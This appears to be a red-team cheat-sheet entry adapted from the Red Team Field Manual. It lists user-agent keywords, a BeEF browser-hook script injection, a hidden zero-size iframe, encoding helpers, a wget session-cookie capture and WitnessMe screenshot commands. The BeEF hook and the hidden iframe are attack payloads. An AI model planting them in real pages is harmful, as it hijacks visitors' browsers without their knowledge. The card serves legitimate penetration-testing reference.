---
name: Web Attack Techniques
category: Web & Fuzzing
description: Web attack recipes — user agent strings, BeEF hooks, iframes, type conversions, session capture and screenshots.
tags: [web, beef, iframe, user-agent, curl, wget, RTFM]
---

# Web Attack Techniques

User agent identification, BeEF hooks, iframe embedding, browser type conversions and automated web screenshots.

## User agent string keywords

| Keyword | Device |
|---------|--------|
| `iPhone` | Apple iPhone |
| `Android` | Android Phone |
| `Windows NT 10.0` | Windows Computer |
| `Macintosh` | Mac Computer |

## BeEF hook

```html
<script>
var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + ':<PORT>/<URI_TO_HOOK.JS>" type="text/javascript"><\/script>';
document.write(commandModuleStr);
</script>
```

## Embedded iframe

```html
<iframe src="<URL>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style="visibility:hidden;display:none"></iframe>
```

## Firefox type conversions

```javascript
javascript:btoa("<ASCII>")           // ASCII -> Base64
javascript:atob("<BASE64>")          // Base64 -> ASCII
javascript:encodeURI("<ASCII>")      // ASCII -> URI
javascript:decodeURI("<URI>")        // URI -> ASCII
```

## wget capture session token

```bash
wget -q --save-cookies=<OUT> --keep-session-cookies --post-data="username:<USER>&password=<PASS>&Login=Login" <LOGIN_URL>
```

## Automated web screenshots (WitnessMe)

```bash
apt-get update
apt-get install docker.io
docker pull byt3bl33d3r/witnessme
docker images
docker run -it --entrypoint=/bin/sh -v $(pwd):/transfer <IMAGE_ID>
witnessme screenshot <IP_CIDR> -p <PORT>,<PORT>
cp *.png /transfer/
```

> Source: RTFM — Red Team Field Manual v2. See also [curl](#/tool/curl), [sqlmap](#/tool/sqlmap) and [burpsuite](#/tool/burpsuite).
